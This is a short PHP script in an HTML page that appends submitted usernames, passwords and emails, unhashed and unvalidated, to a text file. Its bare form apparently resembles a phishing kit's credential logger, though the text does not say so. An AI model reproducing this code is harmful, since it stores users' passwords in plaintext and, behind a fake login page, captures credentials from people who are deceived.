<html>
<body>

<?php
$file = fopen("../output/users.txt","a");
fwrite($file,"Username: " . $_POST["uname"]);
fwrite($file, "\n");
fwrite($file,"Password: " . $_POST["psw"]);
fwrite($file, "\n");
fwrite($file,"Email: " . $_POST["email"]);
fwrite($file, "\n");
fclose($file);
?>

</body>
</html>